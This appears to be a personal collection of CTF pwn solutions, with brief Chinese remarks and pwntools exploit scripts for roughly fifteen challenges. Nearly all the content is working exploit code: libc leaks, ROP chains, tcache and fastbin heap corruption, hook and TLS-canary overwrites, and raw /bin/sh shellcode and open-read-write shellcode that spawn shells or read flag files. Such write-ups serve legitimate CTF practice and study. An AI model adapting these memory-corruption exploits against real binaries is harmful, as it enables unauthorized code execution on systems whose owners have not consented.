### starctf_2019_quicksort

```python
def exp():
    ru("?")
    sl("3")
    payload=str(elf.plt['puts'])+"a"*(0x10-9)+p32(3)+p32(0)+'a'*0x4+p32(elf.got['__stack_chk_fail'])
    ru(":")
    sl(payload)

    ru(":")
    payload=str(elf.plt['puts'])+"a"*(0x10-9)+p32(3)+p32(0)+'a'*0x4+p32(elf.got['free'])
    sl(payload)

    ru(":")
    payload=str(elf.plt['puts'])+"a"*(0x10-9)+p32(3)+p32(2)+'a'*0x4+p32(0x804A044)+'a'*0x10+p32(elf.plt['puts'])+p32(0x80489c9)+p32(elf.got['puts'])
    sl(payload)

    ru("aaaa")
    rv(0xd)
    puts_got=u32(rv(4))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    system_addr=libc_base+libc.symbols['system']
    info("system_addr: "+hex(system_addr))
    binsh_addr=libc_base+libc.search("/bin/sh").next()
    info("binsh_addr: "+hex(binsh_addr))

    ru("?")
    sl("1")
    payload=str(elf.plt['puts'])+"a"*(0x10-9)+p32(1)+p32(0)+'a'*0x4+p32(0x804A044)+'a'*0x10+p32(system_addr)+p32(0x80489c9)+p32(binsh_addr)
    # debug()
    
    sl(payload)
    # ru("")
    # sh.interactive()
```

### d3ctf_2019_ezfile

要骂人了 这个题目真的是太难爆了 1/16*1/16=1/256 看看这个shell的滚动条就知道了 气到要骂人
![](https://blogdownload.oss-cn-hangzhou.aliyuncs.com/20220425143936.png)

主要是劫持了fileno 将其修改为3 这样所有的输入都是从文件流获取 然后栈溢出回到主函数打开flag 然后输出

```python
ru(":")
    sl("Du4t")
    malloc(0x18,'aa\n') # 0
    malloc(0x18,'bb\n') # 1
    malloc(0x18,'cc\n') # 2
    malloc(0x18,'dd\n') # 3
    malloc(0x18,'ee\n') # 4
    malloc(0x18,'ff\n') # 5
    
    delete(1)
    delete(0)
    delete(0)
    malloc(0x1,'\x60') # 0
    malloc(0x10,'aaa\n') # 6
    malloc(0x10,p64(0)+p64(0xa1)) # 7
    for i in range(8):
        delete(0)
    malloc(0x2,'\x70\xfa') # 7

    delete(2)
    delete(2)
    malloc(0x1,'\x70') # 2
    malloc(0x10,'aaa\n') # 8
    malloc(0x10,'aaaa\n') # 9
    malloc(0x1,p8(3))

    
    encrypt(0,0x6a,'/flag'.ljust(0x68,'\x00')+'\x47\x11')
```

### rctf2018_babyheap
环境有问题 应该是16的环境 但是给的是18的环境 打不了

### inndy_homework
```python
def exp():
    ru("?")
    payload='\x00'*0x404+p32(0x80485fb)
    sl(payload)
    ru(">")
    sl("1")
    ru(":")
    sl("14")
    ru("?")
    sl(str(0x80485fb))
    # debug()
```

### n1ctf2018_null

这题感觉很奇妙 是一个堆溢出漏洞 主要是覆盖了子线程中的`arena` 将其修改为函数指针 然后调用system即可 主要是arena结构忘却了 
```python
def exp():
    ru(":")
    sl("i'm ready for challenge") # 0x3e80000000
    for i in range(12):
        malloc(0x4000,1000,'a'*0x3fff)
    malloc(0x4000, 261, 'a'*0x3fff)
    malloc(0x3000,0,'a'*0x2fff)
    malloc(0xfe0, 0, 'a' * 0xfd1)
    # ru(":")
    sleep(0.3) #0x70
    sl('c'*0x5e+p64(0x300000000)+10*p64(0x60201d))
    malloc(0x60,0,('/bin/sh\x00'.ljust(11,'\x00')+p64(elf.plt['system']).ljust(0x60,'a')))
    # debug()

    # malloc(0xfe0, 0, 'cccc'*0xfd0)

    # ru(":")
    # sl('\x00'*0x2+p64(0x7fffffffffffffff))
    # debug()
```

### x_nuca_2018_0gadget

```python
def exp():
    
    malloc(0x10,"a"*0x90,"b")
    malloc(0x70,"c","d")
    malloc(0x80,"e","f")
    malloc(0x10,"g"*0x90,"h")
    # delete(2)
    for i in range(7):
        malloc(0x80,"a","a")
    for i in range(7):
        delete(i+4)
    delete(2)
    show(3)
    ru("note content: ")
    main_arena=u64(rv(6).ljust(8,'\x00'))-96
    info("main_arena: "+hex(main_arena))
    libc_base=main_arena-0x3ebc40
    info("libc_base: "+hex(libc_base))
    one_gadgets=one_gadget("./libc-2.27_64.so")
    ogg=one_gadgets[0]+libc_base
    info("one_gadgets: "+hex(ogg))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))
    free_hook=libc_base+libc.symbols['__free_hook']
    info("free_hook: "+hex(free_hook))
    malloc(0x100,"a","a")
    malloc(0x68,'t','t')
    malloc(0x40,'t','t')
    malloc(0x68,'s','s')
    malloc(0x68,'s'*0x90,'s')
    delete(6)
    delete(7)
    malloc(0x68,p64(malloc_hook),p64(free_hook))
    malloc(0x68,p64(malloc_hook),p64(ogg))
    malloc(0x68,p64(malloc_hook),p64(ogg))
```

### cscctf_2019_qual_babystack
ret2dl_runtime_resolve

```python
rop=roputils.ROP("./cscctf_2019_qual_babystack")
    bss_addr = rop.section(".bss")
    info("bss_addr: "+hex(bss_addr))
    vul_func = 0x08048456
    payload = "a"*0x14+p32(elf.plt['read'])+p32(vul_func)+p32(0)+p32(bss_addr)+p32(0x100)
    sd(payload)


    payload = rop.string("/bin/sh")
    payload += rop.fill(20, payload)
    payload += rop.dl_resolve_data(bss_addr+20, "system")
    payload += rop.fill(100, payload)
    sd(payload)

    payload2 = "a"*20
    payload2 += rop.dl_resolve_call(bss_addr+20, bss_addr)
    sl(payload2)
```

### ciscn_2019_n_6
是exit_hook 注意exit_hook流程即可 64位在_rtld_global+3840 32位在_rtld_global+3848 然后exit_hook的参数在_rtld_global+2312

```python
def exp():
    # sh.interactive()
    ru("it ")
    bss_addr=int(rv(14),16)
    info("bss_addr: "+hex(bss_addr))
    libc_base=bss_addr-libc.symbols['_IO_2_1_stdout_']
    info("libc_base: "+hex(libc_base))
    _rtld_global=libc_base+0x619060
    exit_hook_1=_rtld_global+3840
    info("_rtld_global: "+hex(_rtld_global))
    info("exit_hook_1: "+hex(exit_hook_1))
    exit_hook_2=_rtld_global+3848
    info("exit_hook_2: "+hex(exit_hook_2))
    ogg=libc_base+0x4f322
    info("one_gadget: "+hex(ogg))
    system_addr=libc_base+libc.symbols['system']
    info("system_addr: "+hex(system_addr))

    sd(p64(exit_hook_1))
    sd(p64(system_addr)[0])

    sd(p64(exit_hook_1+1))
    sd(p64(system_addr)[1])

    sd(p64(exit_hook_1+2))
    sd(p64(system_addr)[2])

    sd(p64(_rtld_global+2312))
    sd('s')
    
    sd(p64(_rtld_global+2312+1))
    sd('h')


    # sl("cat flag 1>&0")
```

### ciscn_2019_nw_4
堆上的orw
```python
def exp():
    ru("?")
    sl('Du4t')

    malloc(0x80,'a')
    malloc(0x10,'p')
    for i in range(8):
        delete(0)
    show(0)
    ru("\n")
    main_arena=u64(rv(6).ljust(8,'\x00'))-96
    info("main_arena: "+hex(main_arena))
    libc_base=main_arena-0x3ebc40
    info("libc_base: "+hex(libc_base))
    free_hook=libc_base+libc.symbols['__free_hook']
    info("free_hook: "+hex(free_hook))
    set_context=libc_base+libc.symbols['setcontext']
    info("set_context: "+hex(set_context+53))
    syscall=libc_base+0x00000000000d2975
    info("syscall: "+hex(syscall))
    pop_rax=libc_base+0x00000000000439c8
    pop_rdi=libc_base+0x000000000002155f
    pop_rdx=libc_base+0x0000000000001b96
    pop_rsi=libc_base+0x0000000000023e6a
    jmp_rsp=libc_base+0x0000000000002b1d
    
    malloc(0x68,p64(free_hook))
    delete(2)
    delete(2)

    malloc(0x68,p64(free_hook))
    malloc(0x68,p64(set_context+53))
    malloc(0x68,p64(set_context+53))



    frame=SigreturnFrame(arch='amd64')
    frame.rax=0
    frame.rdi=0
    frame.rsi=free_hook&0xfffffffffffff000
    frame.rdx=0x2000
    frame.rsp=free_hook&0xfffffffffffff000
    frame.rip=syscall
    payload=str(frame)

    malloc(0x100,payload)
    delete(6)

    payload2=p64(pop_rdi)+p64(free_hook&0xfffffffffffff000)+p64(pop_rsi)+p64(0x2000)+p64(pop_rdx)+p64(7)
    payload2+=p64(pop_rax)+p64(10)+p64(syscall)+p64(jmp_rsp)
    shellcode = shellcraft.amd64.open('/flag')
    shellcode += '''
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    mov edi, 1
    mov rsi, rsp
    push 1
    pop rax
    syscall
    '''
    sl(payload2+asm(shellcode,arch="amd64"))
```

### ycb_2020_babypwn
都快忘了IO怎么打了 真蠢啊...
```python
def exp():
    malloc(0x68,p64(0x71),'a'*0x10)# 0
    malloc(0x68,'b'*0x10,'b'*0x10)# 1
    delete(0)
    delete(1)
    delete(0)

    malloc(0x68,'\x90','a'*0x10) # 2
    malloc(0x68,'a'*0x20+p64(0x70)+p64(0x51),'b'*0x10) # 3
    malloc(0x68,'\x00'*0x50+p64(0)+p64(0x71),'c'*0x10) # 4
    malloc(0x68,p64(0)+p64(0x31)+p64(0)*5+p64(0x71),'a'*0x10) # 5
    malloc(0x20,'p','p') # 6
    delete(3)
    delete(5)
    delete(6)

    malloc(0x68,p64(0)+p64(0x31)+p64(0)*5+p64(0xa1),'a'*0x10) # 7
    delete(3)
    delete(6)
    delete(5)

    malloc(0x68,p64(0)+p64(0x31)+p64(0)*5+p64(0x71)+'\xdd\x25','a'*0x10) # 8
    delete(6)
    malloc(0x68,'a','a'*0x10) # 9
    delete(6)

    ru(":") #  10
    sl("1")
    ru(":")
    sl(str(0x68))
    ru(":")
    sd('a'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')

    ru("\n")
    rv(0x40)
    _IO_2_1_stdout_=u64(rv(6).ljust(8,'\x00'))+0x20
    info("_IO_2_1_stdout_: "+hex(_IO_2_1_stdout_))
    libc_base=_IO_2_1_stdout_-libc.sym['_IO_2_1_stdout_']
    info("libc_base: "+hex(libc_base))
    ogg_addr=libc_base+0xf1147
    info("one_gadget: "+hex(ogg_addr))
    malloc_hook=libc_base+libc.sym['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))

    sleep(0.3)
    sl('a')

    delete(6)
    malloc(0x68,'a','a') # 11
    delete(0)
    delete(11)
    delete(0)

    delete(6)
    malloc(0x68,p64(malloc_hook-0x23),'a')
    delete(6)
    malloc(0x68,p64(malloc_hook-0x23),'a')
    delete(6)
    malloc(0x68,p64(malloc_hook-0x23),'a')
    delete(6)
    malloc(0x68,'a'*0x13+p64(ogg_addr),'a')

```

### csaw_pilot

```python
def exp():
    ru("[*]Location:")
    location=int(rv(14),16)
    info("location: "+hex(location))
    ru("[*]Command:")
    payload='\xeb\x0b\x5f\x48\x31\xd2\x48\x89\xd6\xb0\x3b\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68'
    sl(payload.ljust(0x28,'\x00')+p64(location))
```

### inndy_stack
```python
def exp():
    pop()
    push(str(93))
    libc_start_main=pop()-247
    info("libc_start_main: "+hex(libc_start_main))
    libc_base=libc_start_main-libc.symbols['__libc_start_main']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x3a80e-(1<<32)
    info("ogg: "+hex(ogg))
    info("one_ggs: "+str(ogg))
    push(str(ogg))
```

### starctf2018_note
```python
def exp():
    pop_rdi=0x0000000000401003
    pop_rsi_r15=0x0000000000401001
    jmp_rbp=0x00000000004012b3
    pop_rbp=0x0000000000400fff
    pop_rsp=0x0000000000400ffd
    info("puts_plt: "+hex(elf.plt['puts']))
    ru(":")
    sl("Du4t")
    ru(">")
    sl('1')
    ru(":")
    payload=("a"*0xa8+p64(0x401129)).ljust(0x100,'a')
    sl(payload)

    ru(">")
    payload="a"*0x64+p64(pop_rdi)+p64(elf.got['puts'])+p64(pop_rbp)+p64(elf.got['puts'])+p64(0)+p64(0)+p64(jmp_rbp)+p64(pop_rdi)+p64(0x401129)+p64(pop_rsi_r15)+p64(0x602180)+p64(0)
    payload+=p64(pop_rbp)+p64(elf.got['__isoc99_scanf'])+p64(0)+p64(0)+p64(jmp_rbp)+p64(pop_rsp)+p64(0x602180-0x4)+p64(0)+p64(0)+p64(0)
    # debug()
    sd(payload)


    rv(1)
    puts_got=u64(rv(6).ljust(8,'\x00'))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x4526a
    info("one_gadget: "+hex(ogg))

    payload=p64(ogg)
    debug()
    sl(payload)
```

### BCTF_2018_bugstore
覆盖TLS结构体中的canary值 gdb中指令`tls`查看TLS结构体地址

```python
def exp():
    ru(":")
    sl("F")
    payload='%p.'*10
    sl(payload)

    rv(1)
    for i in range(4):
        ru(".")
    code_base=int(rv(14),16)-0xdf0
    info("code_base: {}".format(hex(code_base)))
    for i in range(3):
        ru(".")
    canary=int(rv(18),16)
    info("canary: {}".format(hex(canary)))
    for i in range(2):
        ru(".")
    libc_base=int(rv(14),16)-libc.sym['__libc_start_main']-231
    info("libc_base: {}".format(hex(libc_base)))
    system_addr=libc_base+libc.sym['system']
    info("system_addr: {}".format(hex(system_addr)))
    sh_addr=libc_base+libc.search("/bin/sh").next()
    info("sh_addr: {}".format(hex(sh_addr)))
    ogg=libc_base+0x4f322
    info("ogg: {}".format(hex(ogg)))
    tls=libc_base+0x617580
    info("tls: {}".format(hex(tls)))
    canary_addr=tls+0x28
    info("canary_addr: {}".format(hex(canary_addr)))
    pop_rdi=code_base+0x0000000000000e53

    ru(":")
    sl("A")
    sl(str(canary_addr))


    ru(":")
    sl("S")
    payload='a'*0x28+'BUGSTORE'+'a'*0x8+p64(ogg)
    # debug()
    sl(payload)

```